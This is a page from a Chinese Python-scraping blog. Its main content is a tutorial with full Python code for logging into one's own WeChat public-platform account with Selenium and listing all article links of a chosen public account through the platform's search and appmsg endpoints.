<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
  <meta name="theme-color" content="#222">
  <meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>
  <script id="hexo-configurations">
    var NexT = window.NexT ||
    {};
    var CONFIG = {
      "hostname": "cuiqingcai.com",
      "root": "/",
      "scheme": "Pisces",
      "version": "7.8.0",
      "exturl": false,
      "sidebar":
      {
        "position": "right",
        "width": 360,
        "display": "post",
        "padding": 18,
        "offset": 12,
        "onmobile": false,
        "widgets": [
          {
            "type": "image",
            "name": "阿布云",
            "enable": false,
            "url": "https://www.abuyun.com/http-proxy/introduce.html",
            "src": "https://cdn.cuiqingcai.com/88au8.jpg",
            "width": "100%"
      },
          {
            "type": "image",
            "name": "爬虫书",
            "url": "https://item.jd.com/13527222.html",
            "src": "https://cdn.cuiqingcai.com/ei5og.jpg",
            "width": "100%",
            "enable": true
      },
          {
            "type": "categories",
            "name": "分类",
            "enable": true
      },
          {
            "type": "image",
            "name": "IPIDEA",
            "url": "http://www.ipidea.net/?utm-source=cqc&utm-keyword=?cqc",
            "src": "https://cdn.cuiqingcai.com/0ywun.png",
            "width": "100%",
            "enable": false
      },
          {
            "type": "image",
            "name": "Storm Proxies",
            "src": "https://cdn.cuiqingcai.com/a2zad8.png",
            "url": "https://www.stormproxies.cn/?keyword=jingmi",
            "width": "100%",
            "enable": false
      },
          {
            "type": "friends",
            "name": "友情链接",
            "enable": true
      },
          {
            "type": "hot",
            "name": "猜你喜欢",
            "enable": true
      },
          {
            "type": "tags",
            "name": "标签云",
            "enable": true
      }]
      },
      "copycode":
      {
        "enable": true,
        "show_result": true,
        "style": "mac"
      },
      "back2top":
      {
        "enable": true,
        "sidebar": false,
        "scrollpercent": true
      },
      "bookmark":
      {
        "enable": false,
        "color": "#222",
        "save": "auto"
      },
      "fancybox": false,
      "mediumzoom": false,
      "lazyload": false,
      "pangu": true,
      "comments":
      {
        "style": "tabs",
        "active": "gitalk",
        "storage": true,
        "lazyload": false,
        "nav": null,
        "activeClass": "gitalk"
      },
      "algolia":
      {
        "hits":
        {
          "per_page": 10
        },
        "labels":
        {
          "input_placeholder": "Search for Posts",
          "hits_empty": "We didn't find any results for the search: ${query}",
          "hits_stats": "${hits} results found in ${time} ms"
        }
      },
      "localsearch":
      {
        "enable": true,
        "trigger": "auto",
        "top_n_per_article": 10,
        "unescape": false,
        "preload": false
      },
      "motion":
      {
        "enable": false,
        "async": false,
        "transition":
        {
          "post_block": "bounceDownIn",
          "post_header": "slideDownIn",
          "post_body": "slideDownIn",
          "coll_header": "slideLeftIn",
          "sidebar": "slideUpIn"
        }
      },
      "path": "search.xml"
    };

  </script>
  <meta name="keywords" content="爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书,静觅,崔庆才">
  <meta name="robots" content="index,follow">
  <meta name="GOOGLEBOT" content="index,follow">
  <meta name="author" content="静觅丨崔庆才的个人站点">
  <meta name="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
  <meta property="og:type" content="website">
  <meta property="og:title" content="静觅">
  <meta property="og:url" content="https://cuiqingcai.com/page/14/index.html">
  <meta property="og:site_name" content="静觅">
  <meta property="og:description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
  <meta property="og:locale" content="zh_CN">
  <meta property="article:author" content="崔庆才">
  <meta property="article:tag" content="爬虫教程">
  <meta property="article:tag" content="爬虫">
  <meta property="article:tag" content="Python">
  <meta property="article:tag" content="Python爬虫">
  <meta property="article:tag" content="Python爬虫教程">
  <meta property="article:tag" content="爬虫书">
  <meta property="article:tag" content="静觅">
  <meta property="article:tag" content="崔庆才">
  <meta name="twitter:card" content="summary">
  <link rel="canonical" href="https://cuiqingcai.com/page/14/">
  <script id="page-configurations">
    // https://hexo.io/docs/variables.html
    CONFIG.page = {
      sidebar: "",
      isHome: true,
      isPost: false,
      lang: 'zh-CN'
    };

  </script>
  <title>静觅丨崔庆才的个人站点 - Python爬虫教程</title>
  <meta name="google-site-verification" content="p_bIcnvirkFzG2dYKuNDivKD8-STet5W7D-01woA2fc" />
  <meta name="sogou_site_verification" content="kBOV53NQqT" />
  <noscript>
    <style>
      .use-motion .brand,
      .use-motion .menu-item,
      .sidebar-inner,
      .use-motion .post-block,
      .use-motion .pagination,
      .use-motion .comments,
      .use-motion .post-header,
      .use-motion .post-body,
      .use-motion .collection-header
      {
        opacity: initial;
      }

      .use-motion .site-title,
      .use-motion .site-subtitle
      {
        opacity: initial;
        top: initial;
      }

      .use-motion .logo-line-before i
      {
        left: initial;
      }

      .use-motion .logo-line-after i
      {
        right: initial;
      }

    </style>
  </noscript>
  <link rel="alternate" href="/atom.xml" title="静觅" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner">
        <div class="site-brand-container">
          <div class="site-nav-toggle">
            <div class="toggle" aria-label="切换导航栏">
              <span class="toggle-line toggle-line-first"></span>
              <span class="toggle-line toggle-line-middle"></span>
              <span class="toggle-line toggle-line-last"></span>
            </div>
          </div>
          <div class="site-meta">
            <a href="/" class="brand" rel="start">
              <span class="logo-line-before"><i></i></span>
              <h1 class="site-title">静觅 <span class="site-subtitle"> 崔庆才的个人站点 - Python爬虫教程 </span>
              </h1>
              <span class="logo-line-after"><i></i></span>
            </a>
          </div>
          <div class="site-nav-right">
            <div class="toggle popup-trigger">
              <i class="fa fa-search fa-fw fa-lg"></i>
            </div>
          </div>
        </div>
        <nav class="site-nav">
          <ul id="menu" class="main-menu menu">
            <li class="menu-item menu-item-home">
              <a href="/" rel="section">首页</a>
            </li>
            <li class="menu-item menu-item-archives">
              <a href="/archives/" rel="section">文章列表</a>
            </li>
            <li class="menu-item menu-item-tags">
              <a href="/tags/" rel="section">文章标签</a>
            </li>
            <li class="menu-item menu-item-categories">
              <a href="/categories/" rel="section">文章分类</a>
            </li>
            <li class="menu-item menu-item-about">
              <a href="/about/" rel="section">关于博主</a>
            </li>
            <li class="menu-item menu-item-message">
              <a href="/message/" rel="section">给我留言</a>
            </li>
            <li class="menu-item menu-item-search">
              <a role="button" class="popup-trigger">搜索 </a>
            </li>
          </ul>
        </nav>
        <div class="search-pop-overlay">
          <div class="popup search-popup">
            <div class="search-header">
              <span class="search-icon">
                <i class="fa fa-search"></i>
              </span>
              <div class="search-input-container">
                <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
              </div>
              <span class="popup-btn-close">
                <i class="fa fa-times-circle"></i>
              </span>
            </div>
            <div id="search-result">
              <div id="no-result">
                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>
    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
      <span>0%</span>
    </div>
    <div class="reading-progress-bar"></div>
    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div class="content index posts-expand">
            <div class="carousel">
              <div id="wowslider-container">
                <div class="ws_images">
                  <ul>
                    <li><a target="_blank" href="https://item.jd.com/13527222.html"><img title="Python3网络爬虫开发实战（第二版）上市了！" src="https://cdn.cuiqingcai.com/prwgs.png" /></a></li>
                    <li><a target="_blank" href="https://t.lagou.com/fRCBRsRCSN6FA"><img title="52讲轻松搞定网络爬虫" src="https://cdn.cuiqingcai.com/fqq5e.png" /></a></li>
                    <li><a target="_blank" href="https://cuiqingcai.com/4320.html"><img title="Python3网络爬虫开发视频教程" src="https://cdn.cuiqingcai.com/bjrny.jpg" /></a></li>
                    <li><a target="_blank" href="https://cuiqingcai.com/5094.html"><img title="爬虫代理哪家强？十大付费代理详细对比评测出炉！" src="https://cdn.cuiqingcai.com/nifs6.jpg" /></a></li>
                  </ul>
                </div>
                <div class="ws_thumbs">
                  <div>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/prwgs.png" /></a>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/fqq5e.png" /></a>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/bjrny.jpg" /></a>
                    <a target="_blank" href="#"><img src="https://cdn.cuiqingcai.com/nifs6.jpg" /></a>
                  </div>
                </div>
                <div class="ws_shadow"></div>
              </div>
            </div>
            <link rel="stylesheet" href="/lib/wowslide/slide.css">
            <script src="/lib/wowslide/jquery.min.js"></script>
            <script src="/lib/wowslide/slider.js"></script>
            <script>
              jQuery("#wowslider-container").wowSlider(
              {
                effect: "cube",
                prev: "",
                next: "",
                duration: 20 * 100,
                delay: 100 * 100,
                width: 716,
                height: 297,
                autoPlay: true,
                playPause: true,
                stopOnHover: false,
                loop: false,
                bullets: 0,
                caption: true,
                captionEffect: "slide",
                controls: true,
                onBeforeStep: 0,
                images: 0
              });

            </script>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4652.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4652.html" class="post-title-link" itemprop="url">利用新接口抓取微信公众号的所有文章</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>各位小伙儿伴儿，一定深受过采集微信公众号之苦吧！特别是！！！！！！公共号历史信息！！！这丫除了通过中间代理采集 APP、还真没什么招数能拿到数据啊！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt=""></a> 直到············ 前天晚上微信官方发布了一个文章：<a href="http://mp.weixin.qq.com/s/67sk-uKz9Ct4niT-f4u1KA" target="_blank" rel="noopener">点我</a> 大致意思是说以后发布文章的时候可以直接插入其它公众号的文章了。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161021224219.gif" alt=""></a> 诶妈呀！这不是一直需要的采集接口嘛！啧啧 天助我也啊！来来·········下面大致的说一下方法。</p>
                  <h2 id="1、首先你需要一个订阅号！-公众号、和企业号是否可行我不清楚。因为我木有·····"><a href="#1、首先你需要一个订阅号！-公众号、和企业号是否可行我不清楚。因为我木有·····" class="headerlink" title="1、首先你需要一个订阅号！ 公众号、和企业号是否可行我不清楚。因为我木有·····"></a>1、首先你需要一个订阅号！ 公众号、和企业号是否可行我不清楚。因为我木有·····</h2>
                  <h2 id="2、其次你需要登录！"><a href="#2、其次你需要登录！" class="headerlink" title="2、其次你需要登录！"></a><strong>2、其次你需要登录！</strong></h2>
                  <p>微信公众号登录我没仔细看。 这个暂且不说了，我使用的是 selenium 驱动浏览器获取 Cookie 的方法、来达到登录的效果。</p>
                  <h2 id="3、使用-requests-携带-Cookie、登录获取-URL-的-token（这玩意儿很重要每一次请求都需要带上它）像下面这样："><a href="#3、使用-requests-携带-Cookie、登录获取-URL-的-token（这玩意儿很重要每一次请求都需要带上它）像下面这样：" class="headerlink" title="3、使用 requests 携带 Cookie、登录获取 URL 的 token（这玩意儿很重要每一次请求都需要带上它）像下面这样："></a>3、使用 requests 携带 Cookie、登录获取 URL 的 token（这玩意儿很重要每一次请求都需要带上它）像下面这样：</h2>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/TIM截图20170607085814.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/TIM截图20170607085814.png" alt=""></a></p>
                  <h2 id="4、使用获取到的-token、和公众号的微信号（就是数字-字符那种）、获取到公众号的-fakeid（你可以理解公众号的标识）"><a href="#4、使用获取到的-token、和公众号的微信号（就是数字-字符那种）、获取到公众号的-fakeid（你可以理解公众号的标识）" class="headerlink" title="4、使用获取到的 token、和公众号的微信号（就是数字+字符那种）、获取到公众号的 fakeid（你可以理解公众号的标识）"></a>4、使用获取到的 token、和公众号的微信号（就是数字+字符那种）、获取到公众号的 fakeid（你可以理解公众号的标识）</h2>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/2.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/2.png" alt=""></a></p>
                  <h3 id="我们在搜索公众号的时候浏览器带着参数以-GET-方法想红框中的-URL-发起了请求。请求参数如下："><a href="#我们在搜索公众号的时候浏览器带着参数以-GET-方法想红框中的-URL-发起了请求。请求参数如下：" class="headerlink" title="我们在搜索公众号的时候浏览器带着参数以 GET 方法想红框中的 URL 发起了请求。请求参数如下："></a>我们在搜索公众号的时候浏览器带着参数以 GET 方法想红框中的 URL 发起了请求。请求参数如下：</h3>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/3.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/3.png" alt=""></a></p>
                  <h3 id="请求相应如下："><a href="#请求相应如下：" class="headerlink" title="请求相应如下："></a><strong>请求相应如下：</strong></h3>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/4.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/4.png" alt=""></a></p>
                  <h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/5.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/5.png" alt=""></a></p>
                  <h1 id="好了-我们再继续："><a href="#好了-我们再继续：" class="headerlink" title="好了 我们再继续："></a>好了 我们再继续：</h1>
                  <h2 id="5、点击我们搜索到的公众号之后、又发现一个请求："><a href="#5、点击我们搜索到的公众号之后、又发现一个请求：" class="headerlink" title="5、点击我们搜索到的公众号之后、又发现一个请求："></a><strong>5、点击我们搜索到的公众号之后、又发现一个请求：</strong></h2>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/6.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/6.png" alt=""></a></p>
                  <h3 id="请求参数如下："><a href="#请求参数如下：" class="headerlink" title="请求参数如下："></a>请求参数如下：</h3>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/7.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/7.png" alt=""></a></p>
                  <h3 id="返回如下："><a href="#返回如下：" class="headerlink" title="返回如下："></a>返回如下：</h3>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/8.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/8.png" alt=""></a></p>
                  <h3 id="代码如下：-1"><a href="#代码如下：-1" class="headerlink" title="代码如下："></a>代码如下：</h3>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/9.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/9.png" alt=""></a></p>
                  <h2 id="好了···最后一步、获取所有文章需要处理一下翻页、翻页请求如下："><a href="#好了···最后一步、获取所有文章需要处理一下翻页、翻页请求如下：" class="headerlink" title="好了···最后一步、获取所有文章需要处理一下翻页、翻页请求如下："></a>好了···最后一步、获取所有文章需要处理一下翻页、翻页请求如下：</h2>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/10.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/10.png" alt=""></a></p>
                  <h4 id="我大概看了一下、极客学院每一页大概至少有-5-条信息、也就是总文章数-5-就是有多少页。但是有小数、我们取整，然后加-1-就是总页数了。"><a href="#我大概看了一下、极客学院每一页大概至少有-5-条信息、也就是总文章数-5-就是有多少页。但是有小数、我们取整，然后加-1-就是总页数了。" class="headerlink" title="我大概看了一下、极客学院每一页大概至少有 5 条信息、也就是总文章数/5 就是有多少页。但是有小数、我们取整，然后加 1 就是总页数了。"></a><strong>我大概看了一下、极客学院每一页大概至少有 5 条信息、也就是总文章数/5 就是有多少页。但是有小数、我们取整，然后加 1 就是总页数了。</strong></h4>
                  <h4 id="代码如下：-2"><a href="#代码如下：-2" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h4>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/11.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/11.png" alt=""></a></p>
                  <h2 id="item-get-‘link’-就是我们需要的公众号文章连接啦！继续请求这个-URL-提取里面的内容就是啦！"><a href="#item-get-‘link’-就是我们需要的公众号文章连接啦！继续请求这个-URL-提取里面的内容就是啦！" class="headerlink" title="item.get(‘link’)就是我们需要的公众号文章连接啦！继续请求这个 URL 提取里面的内容就是啦！"></a><strong>item.get(‘link’)就是我们需要的公众号文章连接啦！继续请求这个 URL 提取里面的内容就是啦！</strong></h2>
                  <h1 id="以下是完整的测试代码："><a href="#以下是完整的测试代码：" class="headerlink" title="以下是完整的测试代码："></a><strong>以下是完整的测试代码：</strong></h1>
                  <figure class="highlight xl">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">from pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">post = &#123;&#125;</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(executable_path=<span class="string">'C:\chromedriver.exe'</span>)</span><br><span class="line">driver.get(<span class="string">'https://mp.weixin.qq.com/'</span>)</span><br><span class="line"><span class="built_in">time</span>.sleep(<span class="number">2</span>)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"./*//input[@id='account']"</span>).clear()</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"./*//input[@id='account']"</span>).send_keys(<span class="string">'你的帐号'</span>)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"./*//input[@id='pwd']"</span>).clear()</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"./*//input[@id='pwd']"</span>).send_keys(<span class="string">'你的密码'</span>)</span><br><span class="line"># 在自动输完密码之后记得点一下记住我</span><br><span class="line"><span class="built_in">time</span>.sleep(<span class="number">5</span>)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"./*//a[@id='loginBt']"</span>).click()</span><br><span class="line"># 拿手机扫二维码！</span><br><span class="line"><span class="built_in">time</span>.sleep(<span class="number">15</span>)</span><br><span class="line">driver.get(<span class="string">'https://mp.weixin.qq.com/'</span>)</span><br><span class="line">cookie_items = driver.get_cookies()</span><br><span class="line"><span class="keyword">for</span> cookie_item <span class="built_in">in</span> cookie_items:</span><br><span class="line">    post[cookie_item[<span class="string">'name'</span>]] = cookie_item[<span class="string">'value'</span>]</span><br><span class="line">cookie_str = json.dumps(post)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'cookie.txt'</span>, <span class="string">'w+'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(cookie_str)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import requests</span><br><span class="line">import redis</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">gzlist = [<span class="string">'yq_Butler'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://mp.weixin.qq.com'</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"HOST"</span>: <span class="string">"mp.weixin.qq.com"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">with open(<span class="string">'cookie.txt'</span>, <span class="string">'r'</span>, <span class="attribute">encoding</span>=<span class="string">'utf-8'</span>) as f:</span><br><span class="line">    cookie = f.read()</span><br><span class="line">cookies = json.loads(cookie)</span><br><span class="line">response = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url, <span class="attribute">cookies</span>=cookies)</span><br><span class="line">token = re.findall(r<span class="string">'token=(\d+)'</span>, str(response.url))[0]</span><br><span class="line"><span class="keyword">for</span> query <span class="keyword">in</span> gzlist:</span><br><span class="line">    query_id = &#123;</span><br><span class="line">        <span class="string">'action'</span>: <span class="string">'search_biz'</span>,</span><br><span class="line">        <span class="string">'token'</span> : token,</span><br><span class="line">        <span class="string">'lang'</span>: <span class="string">'zh_CN'</span>,</span><br><span class="line">        <span class="string">'f'</span>: <span class="string">'json'</span>,</span><br><span class="line">        <span class="string">'ajax'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'random'</span>: random.random(),</span><br><span class="line">        <span class="string">'query'</span>: query,</span><br><span class="line">        <span class="string">'begin'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'count'</span>: <span class="string">'5'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    search_url = <span class="string">'https://mp.weixin.qq.com/cgi-bin/searchbiz?'</span></span><br><span class="line">    search_response = requests.<span class="builtin-name">get</span>(search_url, <span class="attribute">cookies</span>=cookies, <span class="attribute">headers</span>=header, <span class="attribute">params</span>=query_id)</span><br><span class="line">    lists = search_response.json().<span class="builtin-name">get</span>(<span class="string">'list'</span>)[0]</span><br><span class="line">    fakeid = lists.<span class="builtin-name">get</span>(<span class="string">'fakeid'</span>)</span><br><span class="line">    query_id_data = &#123;</span><br><span class="line">        <span class="string">'token'</span>: token,</span><br><span class="line">        <span class="string">'lang'</span>: <span class="string">'zh_CN'</span>,</span><br><span class="line">        <span class="string">'f'</span>: <span class="string">'json'</span>,</span><br><span class="line">        <span class="string">'ajax'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'random'</span>: random.random(),</span><br><span class="line">        <span class="string">'action'</span>: <span class="string">'list_ex'</span>,</span><br><span class="line">        <span class="string">'begin'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'count'</span>: <span class="string">'5'</span>,</span><br><span class="line">        <span class="string">'query'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'fakeid'</span>: fakeid,</span><br><span class="line">        <span class="string">'type'</span>: <span class="string">'9'</span></span><br><span class="line">    &#125;</span><br><span class="line">    appmsg_url = <span class="string">'https://mp.weixin.qq.com/cgi-bin/appmsg?'</span></span><br><span class="line">    appmsg_response = requests.<span class="builtin-name">get</span>(appmsg_url, <span class="attribute">cookies</span>=cookies, <span class="attribute">headers</span>=header, <span class="attribute">params</span>=query_id_data)</span><br><span class="line">    max_num = appmsg_response.json().<span class="builtin-name">get</span>(<span class="string">'app_msg_cnt'</span>)</span><br><span class="line">    num = int(int(max_num) / 5)</span><br><span class="line">    begin = 0</span><br><span class="line">    <span class="keyword">while</span> num + 1 &gt; 0 :</span><br><span class="line">        query_id_data = &#123;</span><br><span class="line">            <span class="string">'token'</span>: token,</span><br><span class="line">            <span class="string">'lang'</span>: <span class="string">'zh_CN'</span>,</span><br><span class="line">            <span class="string">'f'</span>: <span class="string">'json'</span>,</span><br><span class="line">            <span class="string">'ajax'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'random'</span>: random.random(),</span><br><span class="line">            <span class="string">'action'</span>: <span class="string">'list_ex'</span>,</span><br><span class="line">            <span class="string">'begin'</span>: <span class="string">'&#123;&#125;'</span>.format(str(begin)),</span><br><span class="line">            <span class="string">'count'</span>: <span class="string">'5'</span>,</span><br><span class="line">            <span class="string">'query'</span>: <span class="string">''</span>,</span><br><span class="line">            <span class="string">'fakeid'</span>: fakeid,</span><br><span class="line">            <span class="string">'type'</span>: <span class="string">'9'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'翻页###################'</span>,begin)</span><br><span class="line">        query_fakeid_response = requests.<span class="builtin-name">get</span>(appmsg_url, <span class="attribute">cookies</span>=cookies, <span class="attribute">headers</span>=header, <span class="attribute">params</span>=query_id_data)</span><br><span class="line">        fakeid_list = query_fakeid_response.json().<span class="builtin-name">get</span>(<span class="string">'app_msg_list'</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> fakeid_list:</span><br><span class="line">            <span class="builtin-name">print</span>(item.<span class="builtin-name">get</span>(<span class="string">'link'</span>))</span><br><span class="line">        num -= 1</span><br><span class="line">        begin = int(begin)</span><br><span class="line">        begin+=5</span><br><span class="line">        time.sleep(2)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h1 id="以上完毕！这就是个测试、代码写得奇丑、各位将就着看啊！看不明白？没关系！看这儿：点我看视频"><a href="#以上完毕！这就是个测试、代码写得奇丑、各位将就着看啊！看不明白？没关系！看这儿：点我看视频" class="headerlink" title="以上完毕！这就是个测试、代码写得奇丑、各位将就着看啊！看不明白？没关系！看这儿：点我看视频"></a><strong>以上完毕！这就是个测试、代码写得奇丑、各位将就着看啊！看不明白？没关系！看这儿：<a href="http://www.bilibili.com/video/av11127609/" target="_blank" rel="noopener">点我看视频</a></strong></h1>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
